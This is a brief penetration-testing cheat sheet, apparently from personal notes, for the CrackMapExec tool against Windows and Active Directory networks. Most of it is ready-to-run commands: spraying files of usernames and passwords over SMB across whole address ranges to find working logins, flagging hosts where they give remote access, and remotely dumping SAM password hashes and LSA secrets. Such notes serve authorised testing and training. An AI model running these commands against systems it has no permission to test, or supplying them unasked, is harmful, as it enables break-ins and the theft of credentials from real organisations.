# [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec)

> "A swiss army knife for pentesting networks." Especially useful for Active Directory environments.

---

## Pass a domain credential to a target to check for access

- `$TARGET`
  - Hostname
  - IP address
  - CIDR range
- `$USERNAME`
  - Single username
  - File of usernames, one per line
- `$PASSWORD`
  - Single password
  - File of passwords, one per line
- `$DOMAIN`
  - Active Directory domain name

```bash
crackmapexec smb $TARGET -d $DOMAIN -u $USERNAME -p $PASSWORD
```

- A successful credential pair will be highlighted in **green**
- A successful credential pair that also has remote access (via wmiexec, evil-winrm, etc.) will be highlighted in **green** and designated ***Pwned***

---

## Pass a local credential to a target to check for access

- `$TARGET`
  - Hostname
  - IP address
  - CIDR range
- `$USERNAME`
  - Single username
  - File of usernames, one per line
- `$PASSWORD`
  - Single password
  - File of passwords, one per line

```bash
crackmapexec smb $TARGET -u $USERNAME -p $PASSWORD --local-auth
```

- A successful credential pair will be highlighted in **green**
- A successful credential pair that also has remote access (via wmiexec, evil-winrm, etc.) will be highlighted in **green** and designated ***Pwned***

---

## Remotely dump SAM hashes

```bash
crackmapexec smb $TARGET [-d $DOMAIN] -u $USERNAME -p $PASSWORD [--local-auth] --sam
```

---

## Remotely dump LSA secrets

```bash
cme smb $TARGET [-d $DOMAIN] -u $USERNAME -p $PASSWORD [--local-auth] --lsa
```